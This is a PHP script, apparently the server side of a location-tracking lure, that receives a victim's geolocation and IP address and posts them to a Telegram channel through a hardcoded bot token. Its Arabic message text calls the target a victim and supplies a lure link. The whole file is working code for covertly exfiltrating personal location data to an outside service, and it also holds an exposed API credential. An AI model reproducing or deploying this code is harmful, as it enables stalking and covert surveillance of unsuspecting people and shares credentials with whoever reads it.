<?php
if(isset($_POST['location']) && isset($_POST['ip'])) {
    $location = $_POST['location'];
    $ip = $_POST['ip'];

    // Set up the Telegram bot API credentials
    $bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    $telegram_api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';

    // Set up the message to send to the Telegram channel
    $message = "Location: $location\nIP: $ip\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com";

    // Set up the inline keyboard with buttons
    $keyboard = array(
        array(
            array(
                'text' => 'فتح الموقع',
                'url' => 'https://www.google.com/maps/search/?api=1&query=' . urlencode($location)
            )
        ),
        array(
            array(
                'text' => 'تتبع بصمة الايبي',
                'url' => 'https://www.iplocation.net/ip-lookup?addr=' . urlencode($ip)
            )
        )
    );

    $inline_keyboard = array('inline_keyboard' => $keyboard);
    $reply_markup = json_encode($inline_keyboard);

    // Send the message to the Telegram channel with the inline keyboard
    $post_fields = array(
        'chat_id' => '@localipy', // Replace with your channel username
        'text' => $message,
        'reply_markup' => $reply_markup
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Echo a success message
    echo 'Location data sent to Telegram channel';
} else {
    // Echo an error message if the location or IP data wasn't received
    echo 'Location data not received';
}
?>